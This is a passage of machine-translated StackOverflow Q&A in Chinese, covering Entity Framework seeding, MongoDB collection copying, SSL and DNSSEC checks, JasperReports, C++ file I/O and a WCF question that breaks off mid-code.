# StackOverflow 问答 13916000-13916999

# c# - EF Code-First 中的种子方法

> ID：13916000
> 
> 赞同：1
> 
> 时间：2012-12-17T14:26:41.797
> 
> 标签：c#, asp.net, entity-framework, ef-code-first

我正在尝试使用 EF 的 Seed 方法用一些示例数据填充我的数据库，但是当我尝试运行它时，没有填充数据。

有谁知道为什么？谢谢。

数据库上下文：

```
public void Seed(EFloristEntities context)
{
    new List<Product>
    {
        new Product() { Id = 1, ProductName = "Product 1", ProductDescription = "a", Price = 1.0}
    }.ForEach(i => context.Products.Add(i));

    context.SaveChanges();
}

public DbSet<Product> Products { get; set; }
public DbSet<Order> Orders { get; set; }
public DbSet<OrderDetails> OrderDetails { get; set; }
public DbSet<Cart> Cart { get; set; } 
```

我的初始化器：

```
public class CreateInitializer : CreateDatabaseIfNotExists<EFloristEntities>
{
    protected override void Seed(EFloristEntities context)
    {
        context.Seed(context);

        base.Seed(context);
    }
} 
```

全球.aspx：

```
Database.SetInitializer(new DropCreateDatabaseIfModelChanges<EFloristEntities>()); 
new EFloristEntities().Database.CreateIfNotExists();

Database.SetInitializer(new CreateInitializer()); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:03:28.237

You have configured the intializer to use DropCreateDatabaseIfModelChanges. Try substituting it with DropCreateDatabaseAlways once.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:33:10.467

您根本没有在全局文件中初始化数据库。您需要运行以下代码：

`EFloristEntities.Database.Initialize(true)`

如果您想使用自定义初始化程序，我建议您将此代码放在该`Database.SetInitializer(new CreateInitializer())`调用下方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-29T16:58:09.963

看起来您在调用自己的种子代码之后调用了基本初始化程序。

# forms - 在 Twig 中设置 Symfony 2 表单字段的默认值

> ID：13916001
> 
> 赞同：38
> 
> 时间：2012-12-17T14:26:42.487
> 
> 标签：forms, symfony, twig

是否可以在 Twig 中设置输入字段的默认值？

我正在渲染表单行：

```
{{ form_widget(form.title) }} 
```

我希望能够设置默认值，例如：

```
{{ form_widget(form.title, {data : 'Default title'}) }} 
```

甚至可能吗？

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2012-12-17T14:38:31.143

默认值的魔术关键字是`value`，不是`data`。

```
{{ form_widget(form.title, {'value' : 'Default title'}) }} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-18T00:14:16.020

您也可以在创建类型时执行此操作。我认为它比在 Twig 中“更干净”。

# mongodb - mongo 从一个集合复制到另一个集合（在同一个数据库上）

> ID：13916004
> 
> 赞同：33
> 
> 时间：2012-12-17T14:26:53.200
> 
> 标签：mongodb

我已经调用了 mongo db `test`，在这个 db 中有两个集合`collection1`和`collection1_backup`. 如何将 的内容替换`collection1`为`collection1_backup`.

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-12-17T14:37:10.427

做到这一点的最好方法（考虑到集合的名称以 结尾`_backup`）可能是使用 mongorestore：[http ://docs.mongodb.org/manual/reference/mongorestore/](http://docs.mongodb.org/manual/reference/mongorestore/)

但是在这种情况下，这取决于。如果集合未分片，您可以使用`renameCollection`（[http://docs.mongodb.org/manual/reference/command/renameCollection/](http://docs.mongodb.org/manual/reference/command/renameCollection/)）或者您可以使用更手动的方法（在 JavaScript 代码中）：

```
db.collection1.drop(); // Drop entire other collection
db.collection1_backup.find().forEach(function(doc){
   db.collection1.insert(doc); // start to replace
}); 
```

这些是最常见的方法。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2019-05-06T22:13:49.413

这可以使用简单的命令来完成：

```
db.collection1_backup.aggregate([ { $match: {} }, { $out: "collection1" } ]) 
```

此命令将删除collection1 的所有文档，然后在collection1 中克隆collection1_backup。

通用命令将是

```
db.<SOURCE_COLLECTION>.aggregate([ { $match: {} }, { $out: "<TARGET_COLLECTION>" } ]) 
```

如果 TARGET_COLLECTION 不存在，上述命令将创建它。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-17T15:48:50.287

也很有用：将集合导出到 json 文件

```
mongoexport --collection collection1_backup --out collection1.json 
```

从 json 文件导入集合

```
mongoimport --db test --collection collection1 --file collection1.json 
```

要从备份/转储文件导入单个集合，需要将 *.bson 文件转换为 *.json 使用

```
bsondump collection1_backup.bson > collection1_backup.json 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-08-22T07:32:46.190

只需这样做。

//删除collection1

```
db.collection1.drop(); 
```

//将数据从collection1_backup复制到collection1

```
db.collection1.insert(db.collection1_backup.find({},{_id:0}).toArray()); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-03-02T08:33:49.437

Better way would be to use [`.toArray()`](https://docs.mongodb.com/manual/reference/method/cursor.toArray/)

```
 db.collection1.drop(); // Drop entire other collection

 // creates an array which can be accessed from "data"
 db.collection1_backup.find().toArray(function(err, data) {

      // creates a collection and inserting the array at once
      db.collection1.insert(data);
 }); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-06-10T11:29:34.163

您可以使用一个简单的命令来备份 MongoDB 集合。它仅适用于**MongoDB 4.0 或更早版本**。

```
db.sourceCollectionName.copyTo('targetCollectionName') 
```

**您的 targetCollectionName 必须在 Single(') 或 Double(") 引用**

笔记：

> db.collection.copyTo() 方法在内部使用 eval 命令。因此，db.collection.copyTo() 操作采用全局锁，该锁会阻塞所有其他读写操作，直到 db.collection.copyTo() 完成。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-09-15T10:26:08.463

Using Java Driver

Try below one:

```
public void copyTo(String db,String sourceCollection,String destinationCollection,int limit) throws        
UnknownHostException {

    MongoClient mongo = new MongoClient("localhost", 27017);
    DB database = mongo.getDB(db);
    DBCollection collection = database.getCollection(sourceCollection);
    DBCursor dbCursor = collection.find().limit(limit);
    List<DBObject> list =  dbCursor.toArray();
    DBCollection destination =  database.getCollection(destinationCollection);
    destination.insert(list, WriteConcern.NORMAL); //WRITE CONCERN is based on your requirment.

} 
```

# java - Struts2：如何在 webapp 之外存储图像并将其路径保存到数据库？

> ID：13916006
> 
> 赞同：0
> 
> 时间：2012-12-17T14:27:03.450
> 
> 标签：java, tomcat, struts2, java-io

到目前为止，我确实将图像保存到 webapp 目录中，并将其路径保存到数据库中。

但现在我试图将图像保存在 webapp 之外，这样如果我部署新的战争文件，那么我的旧`files`文件夹将不会被删除。

从下面的代码中，我的图像文件正确保存到 webapp 之外的指定文件夹中，但我不知道如何将该图像检索到我的 jsp 页面中。

我试过这样

```
<img src="www.myproject.com/struts2project/files/smile.jpg/>" 
```

但这是错误的。我没有让我的图像显示到我的 jsp 页面中。

下面的代码可以很好地将图像上传到绝对路径，但我的问题是如何检索该图像？

```
 `fileSystemPath= "/files"; 
         try{                
             File destFile  = new File(fileSystemPath, thempicFileName);
                 FileUtils.copyFile(thempic, destFile);
                 String path=fileSystemPath+"/"+thempicFileName; 
                 theme=dao.getThemeById(themId); 
                 theme.setThemeScreenshot(path);
                 theme.setThemeName(theme.getThemeName());
                 theme.setThemeCaption(theme.getThemeCaption());
                 dao.saveOrUpdateTheme(theme);

         }catch(IOException e){
            e.printStackTrace();
            return INPUT;
         }` 
```

请帮助我...

我希望我清楚我需要什么，如果我不是，请告诉我，我会尝试以另一种方式解释。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:30:05.340

正如你所说 。. . [这个问题](https://stackoverflow.com/questions/1812244/simplest-way-to-serve-static-data-from-outside-the-application-server-in-a-java)描述了你需要做什么。我想您需要知道的是如何使用 struts 2 最好地实现这一点。这就是发生的事情。

在您的标签中：

该 url 被路由到您的 struts 2 应用程序。正确的？上下文是“struts2project”。
引用问题提供的解决方案之一是使用 Tomcat 服务静态请求的能力并配置 tomcat 以了解保存图像的其他文档根目录。我认为这是一个很好的解决方案。

如果您想将其保留在 struts2 中，我认为您最好的选择是使用专用的“来自其他地方的图像流”操作，该操作将 InputStream 获取到图像，然后使用 Struts2 [Stream Result](http://struts.apache.org/2.3.4.1/docs/stream-result.html)结果类型。该结果类型允许您指定一个临时 InputStream。它还可以帮助您设置适当的标题。请注意，该文档页面上的标题值用于下载文件，因此您不需要这些值。我认为他们会强制浏览器打开图像的另存为对话框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:33:18.743

您已经在使用绝对路径，只需使用 Web 应用程序之外的位置：

```
String destinationDir = "/path/to/my/directory/";
File file = new File(destinationDir + item.getName()); 
```

# ssl - SSL 证书和浏览器到 Web 服务器的连接

> ID：13916008
> 
> 赞同：0
> 
> 时间：2012-12-17T14:27:10.473
> 
> 标签：ssl, https

我确信这包含在 SSL 证书/HTTPS 规范的详细信息中，但我并不完全理解这个主题。

如果现代浏览器连接到 HTTPS 站点，则 HTTP 请求的正文会被加密。SSL 证书本质上是用于在客户端和服务器之间来回通信的“公钥”吗？

难道黑客不能从公共站点获取公钥，比如“https://www.google.com”并监控客户端/服务器流量并解密数据吗？

此外，客户端是否需要验证证书的“颁发者”。例如，自签名证书客户端不需要验证，但对于受信任的颁发者提供的证书，在证书验证过程中会发生什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:42:05.473

服务器的证书包含一个公钥，实际上每个人都可以看到。该密钥又在服务器和客户端之间的握手期间使用，以创建一个唯一的会话密钥，该密钥将用于加密任何进一步的消息：

[http://en.wikipedia.org/wiki/Secure_Sockets_Layer#TLS_handshake_in_detail](http://en.wikipedia.org/wiki/Secure_Sockets_Layer#TLS_handshake_in_detail)

> 难道黑客不能从公共站点获取公钥，比如“https://www.google.com”并监控客户端/服务器流量并解密数据吗？

黑客不会知道会话密钥。他会听（毫无意义的）加密的东西。

> 此外，客户端是否需要验证证书的“颁发者”。例如，自签名证书客户端不需要验证，但对于受信任的颁发者提供的证书，在证书验证过程中会发生什么？

就像您说的那样，证书的颁发者会根据预定义的受信任机构列表进行验证。链中的任何证书也将被验证，包括受信任的颁发者、到期日期。此外，每个证书都包含指向证书吊销列表（CRL 分发点）的 URL，客户端将尝试从此类 URL 下载列表并确保手头的证书没有被吊销。

# javascript - 在 HTML5 Canvas 中添加图像时 KineticJs 未捕获的类型错误

> ID：13916010
> 
> 赞同：0
> 
> 时间：2012-12-17T14:27:17.900
> 
> 标签：javascript, image, html, kineticjs

我正在尝试在画布上添加图像并使用 Kinetic.js 库，但控制台出现错误

```
Uncaught TypeError: Type error 
```

我的代码是：

**[JS小提琴](http://jsfiddle.net/ekTLj/1/)**

**HTML**

```
<!DOCTYPE HTML> 
```

设计

```
#wrapper{
width:300px;
height:200px;
margin:auto;
border-radius: 15px;
border: 4px solid black;
}

#container{
height:120px;
width:100%;
border:1px solid red;
}
#items, #cliparts{
height:55px;
border:1px solid green;
width:100%;
}

#items img, #cliparts img {
max-height:50px;
max-width:40px;
padding: 0 5px;
border:2px double white;
}
#items img:hover,  #cliparts img:hover{
border:2px double blue;
cursor:pointer;
} 
```

**​JavaScript**

 **```
document.getElementById('clip1').addEventListener('click', function() {
                 var stage = new Kinetic.Stage({
                  container: "container",
                  width: 300,
                  height: 100
                });

                 var layer = new Kinetic.Layer();

             var clip_group = new Kinetic.Group({
                  x: 200,
                  y: 30,
                  draggable: true,
               });

            var image_src = 'http://www.clker.com/cliparts/b/9/8/4/12284231761400606271Ricardo_Black_Boy_-_PNG.svg.med.png';

            var clip_image = new Kinetic.Image({
                  x: 0,
                  y: 0,
                  image: image_src,
                  width: 150,
                  height: 138,
                  name: "image",
                });

            clip_group.add(clip_image);
            layer.add(clip_group);
            stage.add(layer);
            stage.draw();               
         }); 
```

​</p>

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-18T03:52:22.550

Kinetic.Image 的 image 属性必须是图像对象，而不是 url 字符串。这是一个例子：

[http://www.html5canvastutorials.com/kineticjs/html5-canvas-kineticjs-image-tutorial/](http://www.html5canvastutorials.com/kineticjs/html5-canvas-kineticjs-image-tutorial/)**

# android - Android NDK：根据预建库构建库时出现问题

> ID：13916015
> 
> 赞同：0
> 
> 时间：2012-12-17T14:27:50.630
> 
> 标签：android, linker, android-ndk

我有一个名为 B 的 ac 库，它依赖于其他名为 A 的 c 库。我确信我可以通过 Android NDK 成功编译和使用 A。

现在我正在尝试使用 Android NDK 编译 B 库。我有一个带有 jni 文件夹的 Android 项目。我的 jni 文件夹包含 A 和 B 文件夹，它们有库 c 代码。jni 文件夹还有一个 prebuilt 文件夹，其中包含 a.so 文件（预构建的 A 库文件）。

我的问题是我无法构建B。我可以编译它，但我无法链接它。拜托，谁能帮我指出我的错误是什么？A 和 B 是我在项目中使用的通用名称，而不是我正在使用的真实名称。我将在下面列出 Android.mk 文件。

用于构建 A 的 Android.mk 文件（此文件对我描述的 Android 项目不可见，尽管它也有 A 代码）：

```
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE    := libA
LOCAL_SRC_FILES := helloworld.c A/src/fileA.c
LOCAL_C_INCLUDES := $(LOCAL_PATH)/A/src
LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/A/src
include $(BUILD_SHARED_LIBRARY) 
```

预建文件夹中的 Android.mk 文件：

```
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE    := libA
LOCAL_SRC_FILES := prebuilt/libA.so
LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/A/src
include $(PREBUILT_SHARED_LIBRARY)

include $(CLEAR_VARS)
LOCAL_MODULE := libB
LOCAL_SRC_FILES := B/src/fileB.c
LOCAL_SHARED_LIBRARIES := libA
include $(BUILD_SHARED_LIBRARY) 
```

当我执行 ndk-build 命令时，我的最终输出类似于：

> B/src/fileB.c:15：错误：未定义对“A_function”的引用 collect2：ld 返回 1 退出状态 make：*** [obj/local/armeabi/libB.so] 错误 1

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:03:56.377

Your B library files can actually access the A library, but they just don't know how. Add the required headers (.h files from the A library) to a subfolder of JNI and specify the following :

```
LOCAL_C_INCLUDES := $(LOCAL_PATH)/your/sub/folder 
```

in your B project declaration.

I still had a problem, and had to declare the A library as PREBUILT_STATIC and then add to the B library

```
LOCAL_WHOLE_STATIC_LIBRARIES := libA 
```

# c++ - 在 VC++ 中读取和写入类数据到二进制文件

> ID：13916020
> 
> 赞同：0
> 
> 时间：2012-12-17T14:28:06.133
> 
> 标签：c++, visual-c++

```
class Student 
{
public:
Student *prev;  
char S_Name[15];
char F_Name[15];
int Reg_Num;
char Section;
char MAoI[15];
float CGPA;
Student *next;
} 
```

我有上面的类，我想在退出程序时将数据写入链接列表的二进制文件，并在程序运行时再次读回并形成链接列表。我已经尝试过，但几次尝试都失败了！

输入数据的代码`Student * Add_Entry() { Student *temp=new Student();

```
char s_Name[15];
char f_Name[15];
int reg_Num;
char section;
char mAoI[15];
float cGPA;

cout <<"**********************Menu***************************\n ";
cout<<"\nEnter the Studets name \"";
cin>>s_Name;

cout<<"\nEnter Father`s name \"";
cin>>f_Name;

cout<<"\nEnter the Registration Number \"";
cin>>reg_Num;

cout<<"\nEnter the Section \"";
cin>>section;

cout<<"\nEnter the Major Area of Interest \"";
cin>>mAoI;

cout<<"\nEnter the Current CGPA \"";
cin>>cGPA;

strcpy_s(temp->S_Name,s_Name);
strcpy_s(temp->F_Name,f_Name);
temp->Reg_Num=reg_Num;
temp->Section=section;
strcpy_s(temp->MAoI,mAoI);
temp->CGPA=cGPA;
temp->next=NULL;
temp->prev=NULL;
return temp;

//temp=Create_node(s_Name,f_Name,reg_Num,section,mAoI,cGPA); 
```

}`

要从文件中读取，我使用 ` char *buffer;

```
 ifstream reader;
    reader.open("student.bin",ios::in | ios::binary);
    if(reader.is_open)
    {
        do
        {
            reader.read(buffer,ch);
            if(Header==NULL)
            {
                Header=(Student)*buffer;
                temporary=Header;
            }

            else
            {
                temporary->next=(Student)*buffer;
                temporary=temporary->next;
            }
        }while(buffer!=NULL);
    } 
```

`

写我使用`temporary=Header; //stream writer的备份条目；writer.open("student.bin",ios::out | ios::binary);

```
 while(temporary!=NULL)
                {   
                    writer.write((char)* temporary,sizeof(temporary));
                    temporary=temporary->next;
                }

                writer.close(); 
```

`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:20:14.217

这一行：

```
Header=(Student)*buffer; 
```

方法：获取缓冲区，它可能是一个指向 char 的指针，并取消引用它，以获得一个`char`. 然后将其`char`转换为`Student`. 编译器不知道如何将 a`char`转换为`Student`.

相反，如果您这样做：

```
Header= *((Student *)buffer); 
```

它将指针转换为正确类型的指针，然后取消引用它以给出一个可以复制的结构。

你到处都这样做。

此外，在阅读时，您不会为最后一项填写“下一个”指针，也不会为任何一项填写“上一个”指针。尽管最后保存的项目中的“下一个”指针可能为零（假设它被正确保存），但上一个指针可以指向任何东西。最佳做法是正确初始化所有内容。

还：

```
if(reader.is_open) 
```

应该：

```
if(reader.is_open()) 
```

# java - 如何以 3 个示例打印碧玉报告而几乎没有什么变化？

> ID：13916025
> 
> 赞同：2
> 
> 时间：2012-12-17T14:28:13.763
> 
> 标签：java, jasper-reports, ireport

我用 iReport 创建了一个 jasper 报告，我可以完美地打印它。我需要打印 3 个示例（原始示例、客户示例、部门示例），更改很少，例如更改报告中的标签。

我`PRINT_FOR`作为参数传递给 iReport。

**有没有人知道如何实现这个目标？**

```
HashMap parameters = new HashMap();
String option = "C:\\option.jasper";
JRDataSource beanDataSource = reportMapper.getDataSource();
JasperPrint jasperPrint = JasperFillManager.fillReport(option, parameters, beanDataSource);
JasperPrintManager.printPage(jasperPrint, 0, true)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T20:39:42.043

`Static Text`您可以使用`Text Field`允许您使用和表达式来确定文本输出的 a，而不是使用字段。在这种情况下，您将检查`PRINT_FOR`参数是否等于客户或部门，如果不使用原始值。你的表达看起来像这样：

```
($P{PRINT_FOR}.equals("DEPARTMENT") ? "Department Label" : ($P{PRINT_FOR}.equals("CLIENT") ? "Client Label" : "Original Label")) 
```

where等于`Department Label`时输出，等于时输出，不等于以上任何一个时输出。`PRINT_FOR``DEPARMTNENT``Client Label``PRINT_FOR``Client``Original Label`

另外值得注意的是，在关于您的代码片段中，您从未`PRINT_FOR`在 java 代码中设置参数的值，并且您没有使用泛型`HashMap`. 它应该看起来更接近：

```
Map<String, Object> parameters = new HashMap<String, Object>();
parameters.put("PRINT_FOR", "CLIENT"); 
```

* * *

**更新：**根据您的评论，您基本上希望同时将所有 3 个报告导出为一个。这可以通过使用[`JRPrintServiceExporter`](http://jasperreports.sourceforge.net/api/net/sf/jasperreports/engine/export/JRPrintServiceExporter.html). 基本上创建三个`JasperPrint`对象，并将它们放在一个列表中。然后使用导出器将它们打印出来。就像是：

```
//add all three JasperPrints to the list below
List<JasperPrint> jasperPrints = new ArrayList<JasperPrint>();

...

//create an exporter
JRExporter exporter = new JRPrintServiceExporter();
//add the JasperPrints to the exporter via the JASPER_PRINT_LIST param
exporter.setParameter(JRExporterParameter.JASPER_PRINT_LIST, jasperPrints);
exporter.setParameter(JRPrintServiceExporterParameter.DISPLAY_PAGE_DIALOG, Boolean.FALSE);
exporter.setParameter(JRPrintServiceExporterParameter.DISPLAY_PRINT_DIALOG, Boolean.TRUE);
//this one makes it so that the settings choosen in the first dialog will be applied to the
//other documents in the list also
exporter.setParameter(JRPrintServiceExporterParameter.DISPLAY_PRINT_DIALOG_ONLY_ONCE, Boolean.TRUE);

exporter.exportReport(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T14:29:40.430

第一个想法就是制作一个通用的报告模板，并有一些“挂钩”，您可以在其中插入每个版本的差异；您可以通过 Java 的参数发送“差异”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-21T20:47:28.557

当您使用自己的 JRBeanCollectionDataSource 时，您必须为每个 JasperPrint 创建它们各自的 JRBeanCollectionDataSource

```
 JRBeanCollectionDataSource dsCliente = new JRBeanCollectionDataSource(listaDetalle);
        JasperPrint jasperPrintCliente = JasperFillManager.fillReport("plantillaDoc.jasper", paramsHojaCliente, dsCliente);
        listaJasperPrint.add(jasperPrintCliente);

        JRBeanCollectionDataSource dsCaja1 = new JRBeanCollectionDataSource(listaDetalle);
        JasperPrint jasperPrintCaja1 = JasperFillManager.fillReport("plantillaDoc.jasper", paramsHojaCaja, dsCaja1);
        listaJasperPrint.add(jasperPrintCaja1); 
```

# python - 如何查看域是否使用 DNSSEC

> ID：13916027
> 
> 赞同：6
> 
> 时间：2012-12-17T14:28:26.133
> 
> 标签：python, security, dns

我正在尝试找到一种方法来查看域是否正在使用 DNSSEC。来自此线程：[如何检查域是否使用 DNSSEC？](https://superuser.com/questions/207026/how-can-i-check-if-a-domain-uses-dnssec)我了解到

```
dig +dnssec <domain> dnskey 
```

可以揭示很多东西。但是经过一些试验，我意识到它只显示名称服务器是否使用 DNSSEC 设置。我需要弄清楚的是，域野兔是否在 NIC 上标记为使用 DNSSEC。

我尝试查看 python 的 dnssec[实现](https://github.com/JohnSpeno/python-dnssec)，但它们似乎都在查看名称服务器而不是原始 NICzone。

在四处挖掘之后，我注意到一些 NICS（例如 sidnl.nl）在 WHOIS 数据中对其进行了注释，但由于这几乎不可靠（并非所有 NICS 都这样做）我正在寻找更好的方法。

分析器不必是编程/使用代码片段，但如果是，我会很高兴它是 python/C#/java 或其他具有易于理解语法的语言。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2019-03-29T00:40:20.897

# TL;博士

诊断非常困难，不要自己做，不要以为单一的DNS查询或者whois输出就可以真正完全回答问题，比较复杂。

如果您信任他们，以下工具很有用，可以让生活变得更简单：

*   [https://dnssec-debugger.verisignlabs.com/](https://dnssec-debugger.verisignlabs.com/)正如很久以前在另一个答案中报道的那样
*   [https://dnsviz.net/](https://dnsviz.net/)基于特定查询的 DNS 层次结构非常漂亮的显示，其中
*   [https://zonemaster.net/](https://zonemaster.net/)一个通用的区域检查器

至少最后两个也是您可以下载并在本地安装以进行相同测试的软件；您还拥有`dig`DNSSEC 或其后继者`delv`（见下文），并`unbound`提供`drill`等效功能集的实用程序。

# “我需要弄清楚域野兔是否在 NIC 上标记为使用 DNSSEC。”

根据您的以下问题，这不是相关的或措辞不佳的内容。

whois 输出中写的东西没有用：它确实有时可以显示`DNSSEC: Yes`或某些等价物，但是 Whois 和 DNS 是两个独立的东西，如果你想处理 DNS 问题，你应该留在 DNS 领域，所以让我们忽略谁是现在。

回到`dig +dnssec <domain> dnskey`，这是一个好的方向，但有两个大问题：

1.  您在使用`dig`时未指定`@`查询的名称服务器。因此，您将获得的回复将来自您可能控制或可能无法控制的某个递归名称服务器，它可能会或可能不会对您说谎，并且您可能会或可能不会控制其路径，在后一种情况下，答案可以修改为过境；要解决这一点，您实际上需要查询域的权威名称服务器之一，因此您首先需要找到它们；这可能会变得复杂，因为您需要使用 DNSSEC 来确保您在所有查询中获得有效回复，同时 DNSSEC 中的任何错误都会给您`SERVFAIL`回复
2.  第二个大问题是，基本上您的查询将显示是否某些 DNSKEY 与区域数据以及任何签名一起发布，但是：
    1.  它不能确保您询问的递归解析器已经验证了任何内容（因此签名可能都是伪造的），因为要做到这一点，您不需要`+nocdflag`（`+dnssec`触发签名的显示，也就是`RRSIG`记录）；`+cdflag`实际上是禁用验证的标志，因此您需要反转它（因为解析器可能会默认验证，在这种情况下，`dig`与`dig +cd`结果进行比较可以帮助解释观察到的错误是否与 DNSSEC 相关（所有 DNSSEC 故障都是目前只是返回`SERVFAIL`，这是一个通用错误代码，可能发生在与 DNSSEC 无关的无数其他案例中；[正在进行向 DNS 交换添加更丰富的错误报告的工作](https://datatracker.ietf.org/doc/draft-ietf-dnsop-extended-error/)）
    2.  最后，即使所有内容都在此处单击，最终域已发布 a 的`DNSKEY`事实并不意味着它已启用 DNSSEC，因为要使其正常工作，它必须具有`DS`与该特定密钥匹配但发布在父权威名称服务器上的记录，即登记处的那些；如果没有这样的记录（并且它的签名本身带有一个已发布的密钥，并且它本身对应于`DS`更高一级的其他记录，依此类推，直到 DNS 根），即使 a`DNSKEY`已发布，它也永远不会被信任，因此域不真的有DNSSEC。

# 像解析器一样进行验证

因此，实际上要从头开始一切并正确执行，您需要做的是递归验证名称服务器将执行的操作：它将 DNSSEC 验证您的域（或失败）。这是证明域启用了 DNSSEC 的唯一测试，因为这意味着它已经发布了需要的内容，父级也发布了它需要的内容，等等。

当然，在您这边手动重做所有这些是一个坏主意，因为 DNSSEC 验证很复杂。

相反，您要做的是，安装一个本地验证解析器，`unbound`或者使用一个库`getdns`来为您处理所有这些，或者您使用远程递归名称服务器为您验证 DNSSEC，**当且仅当**您完全信任两者时有问题的名称服务器以及您和它之间的所有网络路径（或者您现在使用 DoH 或 DoT 将您的 DNS 交换包装到 TLS 流中）。因为如果您使用无法信任的远程服务器，它可能会在 DNSSEC 验证结果方面对您撒谎，并且如果您信任名称服务器而不信任网络路径，那么主动攻击者可以在结果从递归名称服务器到达您之前对其进行修改.

请注意，最新版本的 bind 提供了专门用于 DNSSEC 相关故障排除`delv`的后续版本： [https ://kb.isc.org/docs/aa-01152](https://kb.isc.org/docs/aa-01152)`dig`

> BIND 9.10 包含一个新的调试工具，它是 dig 的继任者。所以，当然，我们不得不将其命名为 delv。它的工作原理与 dig 非常相似，但它更了解 DNSSEC。

`delv +vtrace`清楚地显示每一步的所有验证和`DS`/`DNSKEY`记录检索。

# 在 whois 中显示的 DNSSEC

最后回到这一点，讨论它的真正含义。

如果注册管理机构在某些 whois 输出中显示一个点，表明该域已“签名”，表明 DNSSEC 处于活动状态，这仅意味着一件非常狭窄的事情：在过去的某个时间点（可能是很久以前），注册商赞助此域名代表其客户发送加密材料（相当于 a`DNSKEY`或`DS`记录，取决于注册政策；如果这是`DS`注册服务商希望注册管理机构按原样在注册管理机构权威名称服务器中发布它；如果这相反`DNSKEY`，注册管理机构将自己计算`DS`要发布的值；有时注册服务商必须同时发送两者，以便注册管理机构可以仔细检查`DS`是否从`DNSKEY`) 到注册管理机构，通常通过 EPP，过了一会儿（几小时/几天），该`DS`记录出现在注册管理机构权威名称服务器中。

但：

1.  `DS`现在很少有注册机构会在更新时进行检查，因此当子区域绝对没有`DNSKEY`发布时，注册商可以发送添加记录的请求。这将导致`DNSSEC: yes`whois 输出，但任何解析名称服务器的域都将失败
2.  即使在此更新发生时一切设置正确，名称服务器也可能已更改（更改已签名域的名称服务器是一个难题，特别是如果旧提供商不合作，并且没有好的通用万无一失的解决方案, 除了停止签署域一段时间，然后在名称服务器更改后将其辞职）
3.  即使不更改名称服务器本身，也可以通过错误或自愿更改区域的内容，因此删除仍在发布的`DNSKEY`同时，其效果与第一点相同。`DS`这种情况比预期/希望的要频繁得多。

请注意，某些注册管理机构会对他们发布的所有域进行异步 DNSSEC 检查，如果他们的域不再正确设置，则会警告注册商和/或最终客户。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-02T23:33:45.843

使用来自 verisign 的 dnssec 调试器：http: [//dnssec-debugger.verisignlabs.com/](http://dnssec-debugger.verisignlabs.com/)。

# c++ - 为什么这段代码有超时？

> ID：13916028
> 
> 赞同：-3
> 
> 时间：2012-12-17T14:28:32.297
> 
> 标签：c++

> **可能重复：**
> [为什么这段代码会崩溃？](https://stackoverflow.com/questions/2877084/why-does-this-code-crash)

请告诉我以下代码有什么问题？？？为什么会崩溃？？？

我不能将 collat​​z 值存储在数组中，但是如果我想单独打印它们，它可以完美地工作。

```
#include <iostream>
long collatz(long);

int main()
{
  using namespace std;
  long i=3,t[1000000],p;
  t[0]=0,t[1]=0,t[2]=0;
  for(i=3; i<1000000; i++)
  {
    p=collatz(i);
    t[i]=p;
  }
  cin.clear();
  cin.get();
}

long collatz(long n)
{
  long count=0;
  do {
    if (n%2==0)
    {
      n=n/2;
      count+=1;
    }
    else
    {
      n=((3*n)+1);
      count+=1;
    }
  } while(n!=1);
  return count;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T14:31:05.950

堆栈分配很可能用于：

`long t[1000000];`失败。因此，当您实际写入数组时，它会调用未定义的行为。

动态分配或使用标准容器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:33:29.617

在堆栈上创建一百万个元素很可能会导致堆栈溢出（不是双关语！）。这会导致`i`被覆盖，从而导致无限循环。

# c# - 如何使用单个 WCF 服务支持不同的客户端

> ID：13916033
> 
> 赞同：0
> 
> 时间：2012-12-17T14:28:49.037
> 
> 标签：c#, wcf, wcf-data-services

我需要返回 Employee 类作为对我的 clientA 的响应，如下所示。

```
[OperationContract]

    public Employee GetEmployee(String id)
    {
    ..
    ..
    return emp;
    }

    public class Employee 
    {
    public string Name;
    public string phoneNo;
    } 
```

但这里的问题是客户 B 将使用我的服务，但需要员工的 SSN。如果我将它添加到 Employee 类中，我也会发送给不需要它的 clientA。如何克服这种情况。如果我必须对自定义反序列化做任何事情，如果我要处理 1000 个属性，这不是问题吗？

哪个是更好的解决方案？任何 wcf 架构帮助也会更有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:41:04.240

[在这个链接](https://stackoverflow.com/questions/3358548/can-i-prevent-a-specific-datamember-from-being-deserialized)上有一个非常相似的讨论。基本上，它是指有条件地隐藏数据成员的值。

您可以根据客户端 ID 或凭据（应作为参数传递给服务方法调用）来决定是否要公开数据成员。

```
[OperationContract]
public Employee GetEmployee(int clientId, String id)
{
    var employee = new Employee();

    //here you might use a mapping table between the clients and the exposed data members
    if (clientId == 1)
    {
        employee.IsSSNSerializable = true;
    }
    return employee;
} 
```

该类`Employee`将`SSN`根据`IsSSNSerializable`属性的值公开：

```
[DataContract]
public class Employee
{
